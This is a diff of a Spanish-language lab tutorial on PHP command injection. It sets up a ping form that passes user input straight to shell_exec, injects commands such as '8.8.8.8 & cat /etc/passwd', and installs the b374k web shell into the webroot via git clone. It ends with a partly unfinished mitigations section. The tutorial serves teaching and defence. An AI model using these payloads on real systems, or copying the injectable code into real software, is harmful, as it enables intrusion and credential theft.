@@ -35,43 +35,62 @@ Vamos realizando operaciones:
 
 ## Código vulnerable
 ---
-Archivo vulnerable: rce.php
+En esta ocación vamos a ver una página en el que tenemos un input para meter una dirección ip.
+El programa realizará un ping sobre la dirección que hayamos introducido.
+escribimos  rce.php
 
 ~~~
 <?php
-	$output = shell_exec($_GET['cmd']);
-	echo $output;
+if (isset($_POST['ip'])) {
+        $ip = $_POST['ip'];
+        // Ejecutar el ping y capturar la salida
+        $output = shell_exec("ping -c 4 " . $ip);
+        echo $output;
+}
 ?>
+<form method="post">
+        <input type="text" name="ip" placeholder="Ejemplo: 8.8.8.8" required>
+        <button type="submit">Hacer Ping</button>
+</form>
 ~~~
 
-El código permite que el usuario pueda enviar un comando en la URL (a través del parámetro cmd) y ejecutarlo directamente en el sistema y NO hay validación NI sanitización de la entrada. Por lo tanto se pueden ejecutar coman
+El código permite que el usuario pueda introducir los símbolos ";" "&" y de esta manera podemos ejecutar otros comandos adicionales en el sistema.
 
 ## Explotación de RCE
 ---
 Acceder a la URL y ejecutar un comando básico:
 ~~~
-http://localhost/rce.php?cmd=id
+http://localhost/rce.php
 ~~~
+
 ![](images/rce1.png)
 
-Si se muestra información del sistema o similar (uid=1000(user) gid=1000(user)), la aplicación es vulnerable.
 
-**Intentar listar archivos del servidor:**
-~~~
-http://localhost/rce.php?cmd=ls
-~~~
+Si introducimos una dirección ip se nos muestra si el servidor está accesible
+
+Sin embargo podemos anudar consultas con el operador & por ejemplo `8.8.8.8 & id` que nos mostraría el usuario con el que estamos ejecutando las sentencias php:
 
 ![](images/rce2.png)
 
+Si se muestra información del sistema o similar (uid=1000(user) gid=1000(user)), la aplicación es vulnerable.
+
+![](images/rce3.png)
+
+**Intentar listar archivos del servidor:**
+
+Podemos llegar a listar los archivos del directorio donde se encuentra el archivo rce.php con 8.8.8.8 & ls
+
 Si se muestran archivos del sistema en pantalla, el ataque funciona.
+
+![](images/rce4.png)
 
 **Probar más comandos:**
 
 ~~~
-http://localhost/rce.php?cmd=cat /etc/passwd
+8.8.8.8 & cat /etc/passwd
 ~~~
 
-![](images/rce3.png)
+![](images/rce5.png)
 
 Si muestra el contenido de /etc/passwd, el atacante puede extraer credenciales.
 
@@ -82,12 +101,12 @@ Sólo para nuestro ejemplo dar permisos de escritura a /var/www/html/
 ~~~
 sudo chmod -R 777 /var/www/html/
 ~~~
-Accedemos a la página web: 
+Introducimos codigo para concatenar la ip del servidor dns de Google, con descargar el proyecto git b374k: 
 ~~~
-http://localhost/rce.php?cmd=git clone https://github.com/b374k/b374k.git /var/www/html/b374k
+8.8.8.8 & git clone https://github.com/b374k/b374k.git /var/www/html/b374k
 ~~~
 
-El shell se habrá instalado y podremos acceder a él y ejecutar los comandos que queramos.
+Si lo realiza, estará instalando en el directorio b374k un shell basado en PHP. Luego podremos acceder a él y ejecutar los comandos que queramos.
 
 ~~~
 http://localhost/b374k/index.php
@@ -97,6 +116,7 @@ http://localhost/b374k/index.php
 El atacante tiene control total del sistema.
 
 ### Mitigaciones de RCE
+Para las miti
 **Eliminar el uso de shell_exec()**
 ---
 Si la ejecución de comandos no es necesaria, deshabilitar la funcionalidad completamente.
